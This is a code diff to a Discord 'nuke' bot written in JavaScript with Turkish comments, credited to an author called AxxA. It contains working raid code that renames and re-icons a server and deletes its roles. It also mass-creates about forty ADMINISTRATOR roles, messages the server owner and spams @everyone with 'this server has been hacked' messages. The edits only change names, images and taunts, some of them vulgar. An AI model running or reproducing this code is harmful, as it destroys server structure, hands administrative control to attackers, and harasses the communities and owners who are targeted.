@@ -1150,7 +1150,7 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("é", {
+    .createChannel("ééééééééééééééééééééAxo", {
         type: "voice"
       })
       .then(chan => {
@@ -1249,12 +1249,12 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
     
-    await msg.guild.setIcon("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT_poLUaDJu_YJ2oxecg_eTbuRAjDPsdW3Jqg&usqp=CAU");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
-    await msg.guild.setName("AxxA Uğradı."); //SUNUCUNUN ISMINI DEGISTIRIR
+    await msg.guild.setIcon("https://media.discordapp.net/attachments/877516964942184498/879643666799558656/xx.PNG");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
+    await msg.guild.setName("AxxA Clowsia Uğradı."); //SUNUCUNUN ISMINI DEGISTIRIR
     await msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
-    await client.user.setAvatar("https://static6.depositphotos.com/1163454/653/v/450/depositphotos_6535974-stock-illustration-scarecrow-background.jpg"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
-    await client.user.setUsername("Made By AxxA");    //BOTUN ISMİNİ DEGISTIRIR
-    await msg.guild.owner.send("**Sunucuna Uğradım AxxA'dan İleti.**");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
+    await client.user.setAvatar("https://media.discordapp.net/attachments/877516964942184498/879643666799558656/xx.PNG"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
+    await client.user.setUsername("Complo");    //BOTUN ISMİNİ DEGISTIRIR
+    await msg.guild.owner.send("**'A'xx'A' ' Dan İleti : Sunucuna Uğradım...'**");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
     
   }   
 });
@@ -1263,192 +1263,192 @@ client.on("message", async msg => {
   if (msg.content === "+rolspam") {  //ROL SPAM YAPAR
     msg.delete();
     msg.guild.createRole({
-      name: "Made",
+      name: "Plan'ı Komik Olaydı",
       color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
         msg.guild.createRole({
-      name: "By",
+      name: "Plan'ı Komik Olaydı",
       color: "C22F2F",
       permissions: ["ADMINISTRATOR"]
     });
             msg.guild.createRole({
-      name: "AxxA",
+      name: "Plan'ı Komik Olaydı",
       color: "E12020",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "Sikiş",
+      name: "Plan'ı Komik Olaydı",
       color: "FF0000",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "Her",
+      name: "Plan'ı Komik Olaydı",
       color: "FF3E00",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "HACKED",
+      name: "Plan'ı Komik Olaydı",
       color: "FF4D00",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "HACKED",
+      name: "Plan'ı Komik Olaydı",
       color: "FF6C00",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "HACKED",
+      name: "Plan'ı Komik Olaydı",
       color: "FF9300",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "HACKED",
+      name: "Plan'ı Komik Olaydı",
       color: "FFAE00",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "HACKED",
+      name: "Plan'ı Komik Olaydı",
       color: "FFD500",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "HACKED",
+      name: "Plan'ı Komik Olaydı",
       color: "FFFF00",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "HACKED",
+      name: "Plan'ı Komik Olaydı",
       color: "E0FF00",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "HACKED",
+      name: "Plan'ı Komik Olaydı",
       color: "C1FF00",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "HACKED",
+      name: "Plan'ı Komik Olaydı",
       color: "93FF00",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "HACKED",
+      name: "Plan'ı Komik Olaydı",
       color: "74FF00",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "HACKED",
+      name: "Plan'ı Komik Olaydı",
       color: "3EFF00",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "HACKED",
+      name: "Plan'ı Komik Olaydı",
       color: "0CFF00",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "HACKED",
+      name: "Plan'ı Komik Olaydı",
       color: "00FF2E",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "HACKED",
+      name: "Plan'ı Komik Olaydı",
       color: "00FF6C",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "HACKED",
+      name: "Plan'ı Komik Olaydı",
       color: "00FFA6",
       permissions: ["ADMINISTRATOR"] //www.youtube.com/ENESACARYT TARAFINDAN YAPILMISTIR
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "Plan'ı Komik Olaydı",
       color: "00FFD4",
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "Plan'ı Komik Olaydı",
       color: "00FFFB",
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "Plan'ı Komik Olaydı",
       color: "00C9FF",
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "Plan'ı Komik Olaydı",
       color: "009BFF",
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "Plan'ı Komik Olaydı",
       color: "006CFF",
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "Plan'ı Komik Olaydı",
       color: "003AFF",
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "Plan'ı Komik Olaydı",
       color: "001BFF",
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "Plan'ı Komik Olaydı",
       color: "1F00FF",
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "Plan'ı Komik Olaydı",
       color: "4200FF",
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "Plan'ı Komik Olaydı",
       color: "7C00FF",
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "Plan'ı Komik Olaydı",
       color: "A200FF",
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "Plan'ı Komik Olaydı",
       color: "C500FF",
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "Plan'ı Komik Olaydı",
       color: "E000FF",  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "Plan'ı Komik Olaydı",
       color: "FF00F3",
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "Plan'ı Komik Olaydı",
       color: "FF00B6",
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "Plan'ı Komik Olaydı",
       color: "FF0097",
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "Plan'ı Komik Olaydı",
       color: "FF005D",
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "Made By AxxA ...'X' 'A'",
       color: "FF0032",
       permissions: ["ADMINISTRATOR"]
     });
@@ -1461,7 +1461,7 @@ client.on('message', msg => {
         msg.channel.send('**Hiçbirşey Karşılıksız Kalmaz Kalamaz. - AxxA** @everyone :wink: :heart:'); 
         msg.channel.send('**Bana Nasıl Davranıyorsan Sana O Şekilde Yaklaşırım - AxxA** @everyone :wink: :heart:'); 
         msg.channel.send('**AxxA Uğradı.** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**** @everyone :middle_finger: :ok_hand:'); 
         msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
         msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
         msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
